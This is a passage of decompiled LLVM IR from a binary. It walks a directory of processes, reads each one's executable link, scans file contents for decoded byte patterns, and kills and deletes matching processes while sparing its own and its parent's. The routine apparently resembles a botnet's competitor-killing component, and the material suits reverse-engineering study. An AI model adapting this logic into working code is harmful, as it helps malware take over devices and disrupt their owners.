  %v0_fa9c = load i32, i32* @r5, align 4
  %v1_faa0 = add i32 %stack_var_-8420.2, 1
  store i32 %v1_faa0, i32* %r2.global-to-local, align 4
  store i32 %v4_fa94, i32* @r7, align 4
  %v5_faac = icmp slt i32 %v0_fa9c, %v4_fa94
  %v2_fb0c = call i32 @time(i32* null)
  br i1 %v5_faac, label %dec_label_pc_fb08, label %dec_label_pc_fab0

dec_label_pc_fab0:                                ; preds = %dec_label_pc_fa8c
  %v0_fab8 = load i32, i32* @r4, align 4
  %v2_fab8 = sub i32 %v2_fb0c, %v0_fab8
  %v7_fac0 = icmp slt i32 %v2_fab8, 601
  br i1 %v7_fac0, label %dec_label_pc_fac8, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_fab0
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_fa6c.backedge

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fab0
  %v0_fac8 = load i32, i32* @r7, align 4
  %v7_facc = icmp slt i32 %v0_fac8, 401
  br i1 %v7_facc, label %dec_label_pc_fa6c.backedge, label %dec_label_pc_fad0

dec_label_pc_fad0:                                ; preds = %dec_label_pc_fac8
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_fad8 = urem i32 %v1_faa0, 10
  %v2_fadc = icmp eq i32 %v2_fad8, 0
  br i1 %v2_fadc, label %dec_label_pc_fae4, label %dec_label_pc_fa6c.backedge

dec_label_pc_fae4:                                ; preds = %dec_label_pc_fad0
  %v1_fae8 = call i32 @_sleep(i32 1)
  %v0_faec = load i32, i32* %sl.global-to-local, align 4
  %v1_faf0 = call i32 @_readdir(i32 %v0_faec)
  %v2_faf4 = icmp eq i32 %v1_faf0, 0
  br i1 %v2_faf4, label %dec_label_pc_fafc, label %dec_label_pc_fa7c

dec_label_pc_fafc:                                ; preds = %dec_label_pc_fa6c.backedge, %dec_label_pc_fae4, %dec_label_pc_fa64
  %stack_var_-8420.3 = phi i32 [ %stack_var_-8420.0, %dec_label_pc_fa64 ], [ %v1_faa0, %dec_label_pc_fae4 ], [ %stack_var_-8420.1.be, %dec_label_pc_fa6c.backedge ]
  %v0_fafc = load i32, i32* %sl.global-to-local, align 4
  %v1_fafc = inttoptr i32 %v0_fafc to %__dirstream*
  %v3_fb00 = call i32 @closedir(%__dirstream* %v1_fafc)
  br label %dec_label_pc_fa44

dec_label_pc_fb08:                                ; preds = %dec_label_pc_fa8c
  %v1_fb18 = call i32 @function_13128(i32 6)
  %v1_fb20 = call i32 @function_13128(i32 7)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_fb2c = call i32 @function_13044(i32 6, i32* null)
  store i32 %v3_fb2c, i32* %r1.global-to-local, align 4
  store i32 %v2_fb38, i32* @r0, align 4
  %v3_fb3c = call i32 @function_13a7c(i8* %v2_fb3c, i32 %v3_fb2c)
  store i32 %v2_fb38, i32* %r3.global-to-local, align 4
  %v2_fb48 = add i32 %v3_fb3c, %v2_fb38
  store i32 %v2_fb48, i32* %r5.global-to-local, align 4
  %v0_fb4c = load i32, i32* @r6, align 4
  store i32 %v0_fb4c, i32* %r1.global-to-local, align 4
  store i32 %v2_fb48, i32* @r0, align 4
  %v2_fb54 = inttoptr i32 %v2_fb48 to i8*
  %v3_fb54 = call i32 @function_13a7c(i8* %v2_fb54, i32 %v0_fb4c)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_fb64 = call i32 @function_13044(i32 7, i32* null)
  store i32 %v3_fb64, i32* %r1.global-to-local, align 4
  %v0_fb6c = load i32, i32* %r5.global-to-local, align 4
  %v2_fb6c = add i32 %v3_fb54, %v0_fb6c
  store i32 %v2_fb6c, i32* @r0, align 4
  %v2_fb70 = inttoptr i32 %v2_fb6c to i8*
  %v3_fb70 = call i32 @function_13a7c(i8* %v2_fb70, i32 %v3_fb64)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_fb7c = call i32 @function_13044(i32 6, i32* null)
  store i32 %v3_fb7c, i32* %r1.global-to-local, align 4
  store i32 %v2_fb88, i32* @r0, align 4
  %v3_fb8c = call i32 @function_13a7c(i8* %v2_fb8c, i32 %v3_fb7c)
  %v2_fb98 = add i32 %v3_fb8c, %v2_fb88
  store i32 %v2_fb98, i32* @r5, align 4
  %v0_fb9c = load i32, i32* @r6, align 4
  store i32 %v0_fb9c, i32* %r1.global-to-local, align 4
  store i32 %v2_fb98, i32* @r0, align 4
  %v2_fba4 = inttoptr i32 %v2_fb98 to i8*
  %v3_fba4 = call i32 @function_13a7c(i8* %v2_fba4, i32 %v0_fb9c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_fba4, i32* @r4, align 4
  %v3_fbb4 = call i32 @function_13044(i32 11, i32* null)
  store i32 %v3_fbb4, i32* %r1.global-to-local, align 4
  %v0_fbbc = load i32, i32* @r5, align 4
  %v1_fbbc = load i32, i32* @r4, align 4
  %v2_fbbc = add i32 %v1_fbbc, %v0_fbbc
  store i32 %v2_fbbc, i32* @r0, align 4
  %v2_fbc0 = inttoptr i32 %v2_fbbc to i8*
  %v3_fbc0 = call i32 @function_13a7c(i8* %v2_fbc0, i32 %v3_fbb4)
  %v1_fbc8 = call i32 @function_13070(i32 6)
  %v1_fbd0 = call i32 @function_13070(i32 7)
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_fbe4 = load i32, i32* %stack_var_-8428, align 4
  store i32 %v2_fbe4, i32* %r1.global-to-local, align 4
  %v3_fbe8 = call i32 @_readlink(i32 %v2_fb38, i32 %v2_fbe4, i32 4095)
  %v7_fbf0 = icmp eq i32 %v3_fbe8, -1
  store i32 %v3_fbe8, i32* @r5, align 4
  store i32 -4276, i32* %r2.global-to-local, align 4
  br i1 %v7_fbf0, label %dec_label_pc_fcb8, label %dec_label_pc_fc00

dec_label_pc_fc00:                                ; preds = %dec_label_pc_fb08
  store i32 %v2_fc04, i32* %r1.global-to-local, align 4
  %v2_fc08 = add i32 %v3_fbe8, %v2_fc04
  store i32 %v2_fc08, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_fc10 = add i32 %v2_fc08, -4276
  %v5_fc10 = inttoptr i32 %v4_fc10 to i8*
  store i8 0, i8* %v5_fc10, align 1
  %v1_fc18 = call i32 @function_13128(i32 10)
  %v0_fc1c = load i32, i32* @r4, align 4
  store i32 %v0_fc1c, i32* %r1.global-to-local, align 4
  %v2_fc24 = inttoptr i32 %v0_fc1c to i32*
  %v3_fc24 = call i32 @function_13044(i32 10, i32* %v2_fc24)
  %v0_fc28 = load i32, i32* @r5, align 4
  %v1_fc28 = add i32 %v0_fc28, -1
  store i32 %v1_fc28, i32* @r1, align 4
  store i32 %v3_fc24, i32* %r2.global-to-local, align 4
  %v2_fc30 = load i32, i32* %stack_var_-8428, align 4
  %v3_fc34 = inttoptr i32 %v2_fc30 to i8*
  %v4_fc34 = call i32 @function_13da8(i8* %v3_fc34, i32 %v1_fc28, i32 %v3_fc24)
  %v7_fc38 = icmp eq i32 %v4_fc34, -1
  br i1 %v7_fc38, label %dec_label_pc_fc54, label %dec_label_pc_fc40

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fc00
  %v2_fc40 = load i32, i32* %stack_var_-8428, align 4
  %v3_fc40 = inttoptr i32 %v2_fc40 to i8*
  %v3_fc44 = call i32 @unlink(i8* %v3_fc40)
  store i32 9, i32* %r1.global-to-local, align 4
  %v0_fc50 = call i32 @_kill()
  br label %dec_label_pc_fc54

dec_label_pc_fc54:                                ; preds = %dec_label_pc_fc00, %dec_label_pc_fc40
  %v1_fc58 = call i32 @function_13070(i32 10)
  %v1_fc5c = call i32 @_getpid(i32 %v1_fc58)
  %v0_fc60 = load i32, i32* @r7, align 4
  %v9_fc60 = icmp eq i32 %v0_fc60, %v1_fc5c
  br i1 %v9_fc60, label %dec_label_pc_fc8c, label %dec_label_pc_fc68

dec_label_pc_fc68:                                ; preds = %dec_label_pc_fc54
  %v0_fc68 = call i32 @getppid()
  %v0_fc6c = load i32, i32* @r7, align 4
  %v9_fc6c = icmp eq i32 %v0_fc6c, %v0_fc68
  br i1 %v9_fc6c, label %dec_label_pc_fc8c, label %dec_label_pc_fc74

dec_label_pc_fc74:                                ; preds = %dec_label_pc_fc68
  store i32 ptrtoint (i32* @global_var_1cdf8.160 to i32), i32* %r2.global-to-local, align 4
  %v2_fc78 = load i32, i32* %stack_var_-8428, align 4
  %v2_fc7c = load i32, i32* @global_var_1cdf8.160, align 4
  store i32 %v2_fc7c, i32* %r1.global-to-local, align 4
  %v2_fc80 = inttoptr i32 %v2_fc78 to i8*
  %v3_fc80 = call i32 @function_13e34(i8* %v2_fc80, i32 %v2_fc7c)
  %v2_fc84 = icmp eq i32 %v3_fc80, 0
  br i1 %v2_fc84, label %dec_label_pc_fc98, label %dec_label_pc_fc74.dec_label_pc_fc8c_crit_edge

dec_label_pc_fc74.dec_label_pc_fc8c_crit_edge:    ; preds = %dec_label_pc_fc74
  %v0_fc90.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fc8c

dec_label_pc_fc8c:                                ; preds = %dec_label_pc_fc74.dec_label_pc_fc8c_crit_edge, %dec_label_pc_fc68, %dec_label_pc_fc54
  %v0_fc90 = phi i32 [ %v0_fc90.pre, %dec_label_pc_fc74.dec_label_pc_fc8c_crit_edge ], [ %v0_fc68, %dec_label_pc_fc68 ], [ %v1_fc5c, %dec_label_pc_fc54 ]
  store i32 %v2_fb0c, i32* @r4, align 4
  store i32 %v0_fc90, i32* @r5, align 4
  br label %dec_label_pc_fa6c.backedge

dec_label_pc_fa6c.backedge:                       ; preds = %dec_label_pc_fad0, %dec_label_pc_fac8, %dec_label_pc_fa7c, %dec_label_pc_fc8c, %dec_label_pc_ff3c, %.thread11
  %stack_var_-8420.1.be = phi i32 [ %v1_faa0, %dec_label_pc_ff3c ], [ %v1_faa0, %dec_label_pc_fc8c ], [ %v1_faa0, %.thread11 ], [ %stack_var_-8420.2, %dec_label_pc_fa7c ], [ %v1_faa0, %dec_label_pc_fac8 ], [ %v1_faa0, %dec_label_pc_fad0 ]
  %v0_fa6c = load i32, i32* %sl.global-to-local, align 4
  %v1_fa70 = call i32 @_readdir(i32 %v0_fa6c)
  %v2_fa74 = icmp eq i32 %v1_fa70, 0
  br i1 %v2_fa74, label %dec_label_pc_fafc, label %dec_label_pc_fa7c.preheader

dec_label_pc_fc98:                                ; preds = %dec_label_pc_fc74
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_fc9c = load i32, i32* %stack_var_-8428, align 4
  %v3_fc9c = inttoptr i32 %v2_fc9c to i8*
  %v4_fca0 = call i32 (i8*, i32, ...) @open(i8* %v3_fc9c, i32 0)
  %v7_fca4 = icmp eq i32 %v4_fca0, -1
  store i32 %v4_fca0, i32* @r4, align 4
  br i1 %v7_fca4, label %dec_label_pc_ff70, label %dec_label_pc_fcb0

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc98, %dec_label_pc_ff70
  %v0_fcb0 = phi i32 [ %v4_fca0, %dec_label_pc_fc98 ], [ %v0_fcb0.pre, %dec_label_pc_ff70 ]
  %v1_fcb4 = call i32 @close(i32 %v0_fcb0)
  br label %dec_label_pc_fcb8

dec_label_pc_fcb8:                                ; preds = %dec_label_pc_fb08, %dec_label_pc_fcb0
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_fcc4 = call i32 (i8*, i32, ...) @open(i8* %v2_fb3c, i32 0)
  %v7_fcc8 = icmp eq i32 %v4_fcc4, -1
  br i1 %v7_fcc8, label %dec_label_pc_ff3c, label %dec_label_pc_fcd4

dec_label_pc_fcd4:                                ; preds = %dec_label_pc_fcb8
  %v1_fcd8 = call i32 @function_13128(i32 12)
  %v1_fce0 = call i32 @function_13128(i32 13)
  %v1_fce8 = call i32 @function_13128(i32 14)
  %v1_fcf0 = call i32 @function_13128(i32 15)
  %v1_fcf8 = call i32 @function_13128(i32 16)
  store i32 %v2_fcfc, i32* %r1.global-to-local, align 4
  %v3_fd04 = call i32 @function_13044(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_fd0c, i32* %r1.global-to-local, align 4
  store i32 %v3_fd04, i32* @r5, align 4
  %v3_fd18 = call i32 @function_13044(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_fd20, i32* %r1.global-to-local, align 4
  store i32 %v3_fd18, i32* @r6, align 4
  %v3_fd2c = call i32 @function_13044(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_fd34, i32* %r1.global-to-local, align 4
  store i32 %v3_fd2c, i32* %sb.global-to-local, align 4
  %v3_fd40 = call i32 @function_13044(i32 15, i32* nonnull %stack_var_-40)
  store i32 %v3_fd40, i32* %fp.global-to-local, align 4
  store i32 %v2_fd4c, i32* %r1.global-to-local, align 4
  %v3_fd54 = call i32 @function_13044(i32 16, i32* nonnull %stack_var_-56)
  store i32 %v2_f974, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_fd68114 = call i32 @read(i32 %v4_fcc4, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp216 = icmp slt i32 %v4_fd68114, 1
  br i1 %tmp216, label %dec_label_pc_ff80, label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fcd4, %dec_label_pc_fd5c.backedge
  %v0_fdfc105 = phi i32 [ %v4_fd68, %dec_label_pc_fd5c.backedge ], [ %v4_fd68114, %dec_label_pc_fcd4 ]
  store i32 %v2_f878, i32* %r3.global-to-local, align 4
  %v3_fd78 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_fd78, i32* @r4, align 4
  %v5_fd80 = icmp slt i32 %v0_fdfc105, %v3_fd78
  br i1 %v5_fd80, label %dec_label_pc_fd90, label %dec_label_pc_fe3c.lr.ph

dec_label_pc_fe3c.lr.ph:                          ; preds = %dec_label_pc_fd74
  %v1_fe3470 = add i32 %v0_fdfc105, -1
  store i32 %v1_fe3470, i32* %r1.global-to-local, align 4
  %v0_fe3c.pre = load i32, i32* @r5, align 4
  %v1_fe40.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fe3c

dec_label_pc_fd90:                                ; preds = %dec_label_pc_fe34.backedge, %dec_label_pc_fd74
  %v3_fd94 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_fd94, i32* @r4, align 4
  %v5_fd9c = icmp slt i32 %v0_fdfc105, %v3_fd94
  br i1 %v5_fd9c, label %dec_label_pc_fdac, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_fd90
  %v1_fe6879 = add i32 %v0_fdfc105, -1
  store i32 %v1_fe6879, i32* %r1.global-to-local, align 4
  %v2_fe6880 = icmp eq i32 %v0_fdfc105, 0
  br i1 %v2_fe6880, label %dec_label_pc_fdac, label %dec_label_pc_fe70.lr.ph

dec_label_pc_fe70.lr.ph:                          ; preds = %.thread28
  %v0_fe70.pre = load i32, i32* @r6, align 4
  %v1_fe74.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fe70

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fe68.backedge, %.thread28, %dec_label_pc_fd90
  store i32 %v2_f878, i32* %r1.global-to-local, align 4
  %v3_fdb0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_fdb0, i32* @r4, align 4
  %v5_fdb8 = icmp slt i32 %v0_fdfc105, %v3_fdb0
  br i1 %v5_fdb8, label %dec_label_pc_fdc8, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_fdac
  %v1_fe9c88 = add i32 %v0_fdfc105, -1
  store i32 %v1_fe9c88, i32* %r1.global-to-local, align 4
  %v2_fe9c89 = icmp eq i32 %v0_fdfc105, 0
  br i1 %v2_fe9c89, label %dec_label_pc_fdc8, label %dec_label_pc_fea4.lr.ph

dec_label_pc_fea4.lr.ph:                          ; preds = %.thread37
  %v0_fea4.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_fea8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fea4

dec_label_pc_fdc8:                                ; preds = %dec_label_pc_fe9c.backedge, %.thread37, %dec_label_pc_fdac
  store i32 %v2_f878, i32* %r2.global-to-local, align 4
  %v3_fdcc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_fdcc, i32* @r4, align 4
  %v5_fdd4 = icmp slt i32 %v0_fdfc105, %v3_fdcc
  br i1 %v5_fdd4, label %dec_label_pc_fde4, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_fdc8
  %v1_fed097 = add i32 %v0_fdfc105, -1
  store i32 %v1_fed097, i32* %r1.global-to-local, align 4
  %v2_fed098 = icmp eq i32 %v0_fdfc105, 0
  br i1 %v2_fed098, label %dec_label_pc_fde4, label %dec_label_pc_fed8.lr.ph

dec_label_pc_fed8.lr.ph:                          ; preds = %.thread46
  %v0_fed8.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_fedc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fed8

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fed0.backedge, %.thread46, %dec_label_pc_fdc8
  store i32 %v2_f878, i32* %r3.global-to-local, align 4
  %v3_fde8 = load i32, i32* %stack_var_-56, align 4
  %v5_fdf0 = icmp slt i32 %v0_fdfc105, %v3_fde8
  br i1 %v5_fdf0, label %dec_label_pc_fd5c.backedge, label %.thread52

dec_label_pc_fd5c.backedge:                       ; preds = %dec_label_pc_fe20, %.thread52, %dec_label_pc_fde4
  store i32 %v2_f974, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_fd68 = call i32 @read(i32 %v4_fcc4, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp217 = icmp slt i32 %v4_fd68, 1
  br i1 %tmp217, label %dec_label_pc_ff80, label %dec_label_pc_fd74

.thread52:                                        ; preds = %dec_label_pc_fde4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_fdfc107 = icmp eq i32 %v0_fdfc105, 0
  br i1 %v2_fdfc107, label %dec_label_pc_fd5c.backedge, label %dec_label_pc_fe04.lr.ph

dec_label_pc_fe04.lr.ph:                          ; preds = %.thread52
  %v1_fe0c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fe04

dec_label_pc_fe04:                                ; preds = %dec_label_pc_fe20, %dec_label_pc_fe04.lr.ph
  %v0_fdfc.in = phi i32 [ %v0_fdfc105, %dec_label_pc_fe04.lr.ph ], [ %v0_fdfc, %dec_label_pc_fe20 ]
  %v0_fe20 = phi i32 [ 0, %dec_label_pc_fe04.lr.ph ], [ %v1_fe20, %dec_label_pc_fe20 ]
  %v0_fe14 = phi i32 [ 0, %dec_label_pc_fe04.lr.ph ], [ %v1_fe14., %dec_label_pc_fe20 ]
  %v0_fdfc = add i32 %v0_fdfc.in, -1
  store i32 %v3_fd54, i32* %r3.global-to-local, align 4
  %v2_fe08 = add i32 %v0_fe14, %v3_fd54
  %v3_fe08 = inttoptr i32 %v2_fe08 to i8*
  %v4_fe08 = load i8, i8* %v3_fe08, align 1
  %v6_fe08 = zext i8 %v4_fe08 to i32
  store i32 %v6_fe08, i32* %r2.global-to-local, align 4
  %v2_fe0c = add i32 %v0_fe20, %v1_fe0c.pre
  %v3_fe0c = inttoptr i32 %v2_fe0c to i8*
  %v4_fe0c = load i8, i8* %v3_fe0c, align 1
  %v6_fe0c = zext i8 %v4_fe0c to i32
  store i32 %v6_fe0c, i32* %r3.global-to-local, align 4
  %v9_fe10 = icmp eq i8 %v4_fe0c, %v4_fe08
  %v1_fe14 = add i32 %v0_fe14, 1
  %v1_fe14. = select i1 %v9_fe10, i32 %v1_fe14, i32 0
  store i32 %v1_fe14., i32* %r1.global-to-local, align 4
  br i1 %v9_fe10, label %dec_label_pc_fef8, label %dec_label_pc_fe20

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fef8, %dec_label_pc_fe04
  %v1_fe20 = add i32 %v0_fe20, 1
  %v2_fdfc = icmp eq i32 %v0_fdfc, 0
  br i1 %v2_fdfc, label %dec_label_pc_fd5c.backedge, label %dec_label_pc_fe04

dec_label_pc_fe28:                                ; preds = %dec_label_pc_fe3c
  %v9_fe28 = icmp eq i32 %v3_fd78, %v1_fe48.
  br i1 %v9_fe28, label %dec_label_pc_ff00, label %dec_label_pc_fe34.backedge

dec_label_pc_fe34.backedge:                       ; preds = %dec_label_pc_fe3c, %dec_label_pc_fe28
  %storemerge124 = add i32 %storemerge124.in, 1
  %v1_fe34 = add i32 %v0_fe34, -1
  store i32 %v1_fe34, i32* %r1.global-to-local, align 4
  %v2_fe34 = icmp eq i32 %v0_fe34, 0
  br i1 %v2_fe34, label %dec_label_pc_fd90, label %dec_label_pc_fe3c

dec_label_pc_fe3c:                                ; preds = %dec_label_pc_fe34.backedge, %dec_label_pc_fe3c.lr.ph
  %v0_fe34 = phi i32 [ %v1_fe3470, %dec_label_pc_fe3c.lr.ph ], [ %v1_fe34, %dec_label_pc_fe34.backedge ]
  %storemerge124.in = phi i32 [ 0, %dec_label_pc_fe3c.lr.ph ], [ %storemerge124, %dec_label_pc_fe34.backedge ]
  %v0_fe48 = phi i32 [ 0, %dec_label_pc_fe3c.lr.ph ], [ %v1_fe48., %dec_label_pc_fe34.backedge ]
  %v2_fe3c = add i32 %v0_fe48, %v0_fe3c.pre
  %v3_fe3c = inttoptr i32 %v2_fe3c to i8*
  %v4_fe3c = load i8, i8* %v3_fe3c, align 1
  %v6_fe3c = zext i8 %v4_fe3c to i32
  store i32 %v6_fe3c, i32* %r2.global-to-local, align 4
  %v2_fe40 = add i32 %storemerge124.in, %v1_fe40.pre
  %v3_fe40 = inttoptr i32 %v2_fe40 to i8*
  %v4_fe40 = load i8, i8* %v3_fe40, align 1
  %v6_fe40 = zext i8 %v4_fe40 to i32
  store i32 %v6_fe40, i32* %r3.global-to-local, align 4
  %v9_fe44 = icmp eq i8 %v4_fe40, %v4_fe3c
  %v1_fe48 = add i32 %v0_fe48, 1
  %v1_fe48. = select i1 %v9_fe44, i32 %v1_fe48, i32 0
  br i1 %v9_fe44, label %dec_label_pc_fe28, label %dec_label_pc_fe34.backedge

dec_label_pc_fe5c:                                ; preds = %dec_label_pc_fe70
  %v9_fe5c = icmp eq i32 %v3_fd94, %v1_fe7c.
  br i1 %v9_fe5c, label %dec_label_pc_ff00, label %dec_label_pc_fe68.backedge

dec_label_pc_fe68.backedge:                       ; preds = %dec_label_pc_fe70, %dec_label_pc_fe5c
  %storemerge123 = add i32 %storemerge123.in, 1
  %v1_fe68 = add i32 %v0_fe68, -1
  store i32 %v1_fe68, i32* %r1.global-to-local, align 4
  %v2_fe68 = icmp eq i32 %v0_fe68, 0
  br i1 %v2_fe68, label %dec_label_pc_fdac, label %dec_label_pc_fe70

dec_label_pc_fe70:                                ; preds = %dec_label_pc_fe68.backedge, %dec_label_pc_fe70.lr.ph
  %v0_fe68 = phi i32 [ %v1_fe6879, %dec_label_pc_fe70.lr.ph ], [ %v1_fe68, %dec_label_pc_fe68.backedge ]
  %storemerge123.in = phi i32 [ 0, %dec_label_pc_fe70.lr.ph ], [ %storemerge123, %dec_label_pc_fe68.backedge ]
  %v0_fe7c = phi i32 [ 0, %dec_label_pc_fe70.lr.ph ], [ %v1_fe7c., %dec_label_pc_fe68.backedge ]
  %v2_fe70 = add i32 %v0_fe7c, %v0_fe70.pre
  %v3_fe70 = inttoptr i32 %v2_fe70 to i8*
  %v4_fe70 = load i8, i8* %v3_fe70, align 1
  %v6_fe70 = zext i8 %v4_fe70 to i32
  store i32 %v6_fe70, i32* %r2.global-to-local, align 4
  %v2_fe74 = add i32 %storemerge123.in, %v1_fe74.pre
  %v3_fe74 = inttoptr i32 %v2_fe74 to i8*
  %v4_fe74 = load i8, i8* %v3_fe74, align 1
  %v6_fe74 = zext i8 %v4_fe74 to i32
  store i32 %v6_fe74, i32* %r3.global-to-local, align 4
  %v9_fe78 = icmp eq i8 %v4_fe74, %v4_fe70
  %v1_fe7c = add i32 %v0_fe7c, 1
  %v1_fe7c. = select i1 %v9_fe78, i32 %v1_fe7c, i32 0
  br i1 %v9_fe78, label %dec_label_pc_fe5c, label %dec_label_pc_fe68.backedge

dec_label_pc_fe90:                                ; preds = %dec_label_pc_fea4
  %v9_fe90 = icmp eq i32 %v3_fdb0, %v1_feb0.
  br i1 %v9_fe90, label %dec_label_pc_ff00, label %dec_label_pc_fe9c.backedge

dec_label_pc_fe9c.backedge:                       ; preds = %dec_label_pc_fea4, %dec_label_pc_fe90
  %storemerge122 = add i32 %storemerge122.in, 1
  %v1_fe9c = add i32 %v0_fe9c, -1
  store i32 %v1_fe9c, i32* %r1.global-to-local, align 4
  %v2_fe9c = icmp eq i32 %v0_fe9c, 0
  br i1 %v2_fe9c, label %dec_label_pc_fdc8, label %dec_label_pc_fea4

dec_label_pc_fea4:                                ; preds = %dec_label_pc_fe9c.backedge, %dec_label_pc_fea4.lr.ph
  %v0_fe9c = phi i32 [ %v1_fe9c88, %dec_label_pc_fea4.lr.ph ], [ %v1_fe9c, %dec_label_pc_fe9c.backedge ]
  %storemerge122.in = phi i32 [ 0, %dec_label_pc_fea4.lr.ph ], [ %storemerge122, %dec_label_pc_fe9c.backedge ]
  %v0_feb0 = phi i32 [ 0, %dec_label_pc_fea4.lr.ph ], [ %v1_feb0., %dec_label_pc_fe9c.backedge ]
  %v2_fea4 = add i32 %v0_feb0, %v0_fea4.pre
  %v3_fea4 = inttoptr i32 %v2_fea4 to i8*
  %v4_fea4 = load i8, i8* %v3_fea4, align 1
  %v6_fea4 = zext i8 %v4_fea4 to i32
  store i32 %v6_fea4, i32* %r2.global-to-local, align 4
  %v2_fea8 = add i32 %storemerge122.in, %v1_fea8.pre
  %v3_fea8 = inttoptr i32 %v2_fea8 to i8*
  %v4_fea8 = load i8, i8* %v3_fea8, align 1
  %v6_fea8 = zext i8 %v4_fea8 to i32
  store i32 %v6_fea8, i32* %r3.global-to-local, align 4
  %v9_feac = icmp eq i8 %v4_fea8, %v4_fea4
  %v1_feb0 = add i32 %v0_feb0, 1
  %v1_feb0. = select i1 %v9_feac, i32 %v1_feb0, i32 0
  br i1 %v9_feac, label %dec_label_pc_fe90, label %dec_label_pc_fe9c.backedge

dec_label_pc_fec4:                                ; preds = %dec_label_pc_fed8
  %v9_fec4 = icmp eq i32 %v3_fdcc, %v1_fee4.
  br i1 %v9_fec4, label %dec_label_pc_ff00, label %dec_label_pc_fed0.backedge

dec_label_pc_fed0.backedge:                       ; preds = %dec_label_pc_fed8, %dec_label_pc_fec4
  %storemerge = add i32 %storemerge.in, 1
  %v1_fed0 = add i32 %v0_fed0, -1
  store i32 %v1_fed0, i32* %r1.global-to-local, align 4
  %v2_fed0 = icmp eq i32 %v0_fed0, 0
  br i1 %v2_fed0, label %dec_label_pc_fde4, label %dec_label_pc_fed8

dec_label_pc_fed8:                                ; preds = %dec_label_pc_fed0.backedge, %dec_label_pc_fed8.lr.ph
  %v0_fed0 = phi i32 [ %v1_fed097, %dec_label_pc_fed8.lr.ph ], [ %v1_fed0, %dec_label_pc_fed0.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_fed8.lr.ph ], [ %storemerge, %dec_label_pc_fed0.backedge ]
  %v0_fee4 = phi i32 [ 0, %dec_label_pc_fed8.lr.ph ], [ %v1_fee4., %dec_label_pc_fed0.backedge ]
  %v2_fed8 = add i32 %v0_fee4, %v0_fed8.pre
  %v3_fed8 = inttoptr i32 %v2_fed8 to i8*
  %v4_fed8 = load i8, i8* %v3_fed8, align 1
  %v6_fed8 = zext i8 %v4_fed8 to i32
  store i32 %v6_fed8, i32* %r2.global-to-local, align 4
  %v2_fedc = add i32 %storemerge.in, %v1_fedc.pre
  %v3_fedc = inttoptr i32 %v2_fedc to i8*
  %v4_fedc = load i8, i8* %v3_fedc, align 1
  %v6_fedc = zext i8 %v4_fedc to i32
  store i32 %v6_fedc, i32* %r3.global-to-local, align 4
  %v9_fee0 = icmp eq i8 %v4_fedc, %v4_fed8
  %v1_fee4 = add i32 %v0_fee4, 1
  %v1_fee4. = select i1 %v9_fee0, i32 %v1_fee4, i32 0
  br i1 %v9_fee0, label %dec_label_pc_fec4, label %dec_label_pc_fed0.backedge

dec_label_pc_fef8:                                ; preds = %dec_label_pc_fe04
  %v9_fef8 = icmp eq i32 %v3_fde8, %v1_fe14.
  br i1 %v9_fef8, label %dec_label_pc_ff00, label %dec_label_pc_fe20

dec_label_pc_ff00:                                ; preds = %dec_label_pc_fe28, %dec_label_pc_fe5c, %dec_label_pc_fe90, %dec_label_pc_fec4, %dec_label_pc_fef8
  %v1_ff04 = call i32 @function_13070(i32 12)
  %v1_ff0c = call i32 @function_13070(i32 13)
  %v1_ff14 = call i32 @function_13070(i32 14)
  %v1_ff1c = call i32 @function_13070(i32 15)
  %v1_ff24 = call i32 @function_13070(i32 16)
  %v1_ff2c = call i32 @close(i32 %v4_fcc4)
  store i32 9, i32* %r1.global-to-local, align 4
  %v0_ff38 = call i32 @_kill()
  br label %dec_label_pc_ff3c

dec_label_pc_ff3c:                                ; preds = %dec_label_pc_fcb8, %dec_label_pc_ff80, %dec_label_pc_ff00
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_ff48 = call i32 @function_13af4(i32 %v2_fb38, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_ff58 = call i32 @function_13af4(i32 %v2_fb88, i32 64)
  %v1_ff60 = call i32 @_sleep(i32 1)
  store i32 %v2_fb0c, i32* @r4, align 4
  %v0_ff68 = load i32, i32* @r7, align 4
  store i32 %v0_ff68, i32* @r5, align 4
  br label %dec_label_pc_fa6c.backedge

dec_label_pc_ff70:                                ; preds = %dec_label_pc_fc98
  store i32 9, i32* %r1.global-to-local, align 4
  %v0_ff78 = call i32 @_kill()
